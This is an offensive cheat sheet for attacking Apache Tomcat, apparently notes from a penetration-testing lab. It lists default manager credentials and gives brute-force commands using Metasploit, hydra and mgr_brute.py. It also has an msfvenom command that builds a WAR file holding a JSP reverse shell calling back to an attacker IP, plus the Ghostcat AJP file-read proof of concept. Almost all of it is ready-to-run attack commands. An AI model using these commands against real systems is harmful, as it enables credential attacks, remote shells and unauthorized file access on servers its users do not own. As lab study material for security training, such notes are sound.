## Enumeration 
#### tomcat version 
```bash
curl -S URL:8080/docs/ | grep Tomcat
```

#### directory bruteforcing 
```bash
gobuster dir -u <URL:8180/ -w /usr/share/wordlists/directory-list-2.3-small.txt
```

#### login bruteforce 
```bash
# default credentials - /manager/html
<tomcat:tomcat>
<tomcat:s3cret>
<admin:admin>
<admin:s3cret>
<admin:tomcat>
<admin:s3cr3t>
<admin:blank>

# metasploit
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58

# mgr_brute.py
python3 mgr_brute.py -h
python3 mgr_brute.py -U http://10.10.10.95:8080/ -P /manger/ -u /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -p
/usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt

# hydra
hydra -C /usr/share/wordlists/metasploit/tomcat-betterdefaultpasslist.txt http-get://IP:port/manager/html
```

<br> 
<br> 

## Attacking Tomcat
#### WAR file upload to RCE 
```bash
# manual exploit 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

# metasploit
multi/http/tomcat_mgr_upload
```
<br> 

#### Ghostcat - Unauthenticated LFI (infromation disclosure) 
The vulnerability allows an attacker to reach files withtin the webapp (ex. web.xml) and other sensitive files (does not work for /etc/passwd) 
```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

# PoC
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

